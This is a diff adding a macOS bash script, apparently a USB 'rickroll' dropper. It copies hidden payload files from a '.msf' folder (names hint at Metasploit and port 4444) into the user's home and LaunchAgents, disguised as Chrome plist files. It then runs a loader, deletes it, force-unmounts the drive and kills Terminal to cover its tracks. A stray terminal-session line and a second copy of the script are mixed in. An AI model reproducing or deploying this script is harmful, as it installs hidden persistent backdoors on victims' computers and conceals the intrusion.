@@ -1,0 +1,66 @@
+#!/usr/bin/env bash
+
+launchctl remove com.apple.swcdj
+launchctl remove com.apple.swcdj1
+
+cd /Volumes/lmao/.msf; cp apple .apple; cp ssh. .ssh.; cp 4444 .4444; cp com.chrome2.plist .com.chrome2.plist; cp com.chrome1.plist .com.chrome1.plist; cp load.sh .load.sh; cp cups.py .cups.py
+
+mv .ssh. ../../; mv .load.sh ../../; mv .4444 ../../
+
+cd ../../../;
+
+mv /Volumes/lmao/.msf/.com.chrome2.plist ~/Library/LaunchAgents; mv /Volumes/lmao/.msf/.apple ~/; mv /Volumes/lmao/.msf/.com.chrome1.plist ~/Library/LaunchAgents; mv /Volumes/lmao/.msf/.cups.py ~/
+
+cd ~/Library/LaunchAgents; cp .com.chrome1.plist .com.chrome.plist; cp .com.chrome2.plist .com.chrome3.plist
+
+rm .com.chrome1.plist; rm .com.chrome2.plist
+
+cd ../../; cd /Volumes; ./.load.sh
+
+rm .load.sh
+
+diskutil unmountDisk force LMAO & killall Terminal
+
+Last login: Mon May 15 15:39:27 on ttys001
+You have mail.
+Maxs-MacBook-Air-6:~ 009067$ cd /Volumes/lmao
+Maxs-MacBook-Air-6:lmao 009067$ vim rickroll 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#!/usr/bin/env bash
+
+cd /Volumes/lmao/.msf; cp ssh. .ssh.; cp 4444 .4444; cp com.chrome2.plist .com.chrome2.plist; cp com.chrome1.plist .com.chrome1.plist; cp load.sh .load.sh; cp cups.py .cups.py
+
+mv .ssh. ../../; mv .load.sh ../../; mv .4444 ../../
+
+cd ../../../;
+
+mv /Volumes/lmao/.msf/.com.chrome2.plist ~/Library/LaunchAgents; mv /Volumes/lmao/.msf/.apple ~/; mv /Volumes/lmao/.msf/.com.chrome1.plist ~/Library/LaunchAgents; mv /Volumes/lmao/.msf/.cups.py ~/
+
+cd ~/Library/LaunchAgents; cp .com.chrome1.plist .com.chrome.plist; cp .com.chrome2.plist .com.chrome3.plist
+
+rm .com.chrome1.plist; rm .com.chrome2.plist
+
+cd ../../; cd /Volumes; ./.load.sh
+
+rm .load.sh
+
+diskutil unmountDisk force /Volumes/LMAO & killall Terminal
